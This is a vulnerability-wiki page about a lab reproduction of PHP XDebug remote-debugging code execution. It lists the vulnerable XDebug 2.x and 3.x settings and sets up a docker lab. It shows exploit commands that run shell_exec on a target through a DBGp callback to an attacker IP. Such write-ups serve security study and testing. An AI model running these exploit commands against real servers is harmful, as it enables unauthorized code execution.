<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Php/xdebug-rce/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>PHP XDebug Remote Debugging Code Execution - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "PHP XDebug Remote Debugging Code Execution", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        PHP XDebug远程调试导致代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../php_xxe/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../php_xxe/README.zh-cn/" class="btn btn-xs btn-link">
        PHP XML 外部实体注入漏洞（XXE）
      </a>
    </div>
    
  </div>

    

    <h1 id="php-xdebug-remote-debugging-code-execution">PHP XDebug Remote Debugging Code Execution<a class="headerlink" href="#php-xdebug-remote-debugging-code-execution" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>XDebug is a PHP extension used for debugging PHP code. When remote debugging mode is enabled with appropriate settings, an attacker can execute arbitrary PHP code on the target server by exploiting the debug protocol (DBGp).</p>
<p>For XDebug version 2.x, the vulnerability occurs when the following configuration is enabled:</p>
<div class="highlight"><pre><span></span><code><span class="na">xdebug.remote_connect_back</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">1</span>
<span class="na">xdebug.remote_enable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">1</span>
</code></pre></div>
<p>For XDebug version 3.x (which introduced breaking changes in configuration), the equivalent vulnerable configuration is:</p>
<div class="highlight"><pre><span></span><code><span class="na">xdebug.mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">debug</span>
<span class="na">xdebug.discover_client_host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">1</span>
<span class="na">xdebug.client_host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">1</span>
</code></pre></div>
<p>When these configurations are enabled, XDebug will attempt to connect back to the attacker's IP through the DBGp protocol when a client visits the appropriate trigger URL. The DBGp protocol provides an <code>eval</code> function that can be used to execute arbitrary PHP code.</p>
<p>References:</p>
<ul>
<li><a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></li>
<li><a href="https://xdebug.org">https://xdebug.org</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to build and start the vulnerable environment:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>The environment includes two services:</p>
<ul>
<li>PHP 7.1 with XDebug 2.5.5: Accessible at <code>http://your-ip:8080/</code></li>
<li>PHP 7.4 with XDebug 3.1.6: Accessible at <code>http://your-ip:8081/</code></li>
</ul>
<p>After the environment is started, visit each URL to see a simple phpinfo page. You can verify that XDebug is enabled and configured for remote debugging in the PHP configuration section.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>Since the vulnerability requires communication using the DBGp protocol with the target server, it cannot be reproduced using HTTP protocol alone.</p>
<p>A proof-of-concept exploit script <a href="exp.py">exp.py</a> is provided that can execute arbitrary PHP code on the target server. The script supports both XDebug 2.x (port 9000) and XDebug 3.x (port 9003):</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Requires Python 3 and the requests library</span>
python3<span class="w"> </span>exp.py<span class="w"> </span>-t<span class="w"> </span>http://<span class="o">[</span>target-ip<span class="o">]</span>:8080/index.php<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;shell_exec(&quot;id&quot;);&#39;</span><span class="w"> </span>--dbgp-ip<span class="w"> </span><span class="o">[</span>attacker-ip<span class="o">]</span>
python3<span class="w"> </span>exp.py<span class="w"> </span>-t<span class="w"> </span>http://<span class="o">[</span>target-ip<span class="o">]</span>:8081/index.php<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;shell_exec(&quot;id&quot;);&#39;</span><span class="w"> </span>--dbgp-ip<span class="w"> </span><span class="o">[</span>attacker-ip<span class="o">]</span>
</code></pre></div>
<p>Successful exploitation will execute the command and return its output:</p>
<p><img alt="" src="1.png" /></p>
<h3 id="important-notes">Important Notes<a class="headerlink" href="#important-notes" title="Permanent link">&para;</a></h3>
<p>The exploitation process involves a reverse connection:</p>
<ol>
<li>The exploit script listens on port 9000 (XDebug 2.x) and port 9003 (XDebug 3.x), please make sure these ports are not blocked by the firewall</li>
<li>You have to have a public IP address or be in the same network as the target</li>
<li>If your public IP differs from your local machine, use the <code>--dbgp-ip</code> parameter to specify the IP address that the target server can reach</li>
</ol>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        PHP XDebug远程调试导致代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../php_xxe/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../php_xxe/README.zh-cn/" class="btn btn-xs btn-link">
        PHP XML 外部实体注入漏洞（XXE）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>